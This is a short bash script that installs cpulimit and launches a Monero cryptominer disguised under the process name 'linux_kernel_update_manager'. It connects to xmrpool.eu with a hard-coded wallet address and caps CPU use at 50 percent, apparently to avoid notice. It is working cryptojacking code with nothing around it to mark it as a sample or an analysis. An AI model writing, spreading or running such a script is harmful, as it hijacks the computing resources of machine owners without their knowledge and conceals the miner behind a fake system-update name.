#!/bin/bash
sudo apt-get update &
sleep 10
sudo apt install -y cpulimit &&
chmod +x ~/gg003/linux_kernel_update_manager &&
cpulimit -e linux_kernel_update_manager -l 50 -b &
sleep 10
~/gg003/./linux_kernel_update_manager --any --ssl --forever --variation 3 -o xmrpool.eu:443 -u 45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev.3000 -p google  -c ~/gg001/config.txt &
sleep 60m


